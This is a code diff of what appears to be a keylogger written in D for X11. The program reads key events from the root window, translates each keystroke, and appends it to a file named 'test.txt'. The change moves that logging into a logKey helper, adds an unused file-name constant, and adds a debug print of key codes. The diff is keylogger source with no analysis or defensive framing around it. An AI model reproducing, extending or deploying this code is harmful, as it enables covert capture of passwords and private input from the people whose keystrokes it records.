@@ -6,6 +6,8 @@ import x11.Xutil;
 import std.conv;
 import std.file;
 
+enum saveFile = "test.txt";
+
 void main() {
 	Display* d = XOpenDisplay(null);
     Window root = DefaultRootWindow(d);
@@ -35,14 +37,21 @@ void main() {
 				len = XLookupString(&ev.xkey, buf.ptr, 16, &ks, &comp);
                 string pressedkey = getKey(cast(int)ks);
 				if (pressedkey != null) {
-					std.file.append("test.txt", cast(void[])(pressedkey));
+					logKey(cast(void[])(pressedkey));
 				} else {
                 	buf[len]=0;
-                	std.file.append("test.txt", cast(void[])(to!string(buf[0])));
+                	logKey(cast(void[])(to!string(buf[0])));
+				}
+				debug {
+					writefln("Key code: %d", cast(int)ks);
 				}
 			default: break;
         }
     }
+}
+
+void logKey(void[] toWrite) {
+	std.file.append("test.txt", toWrite);
 }
 
 string getKey(int key) {
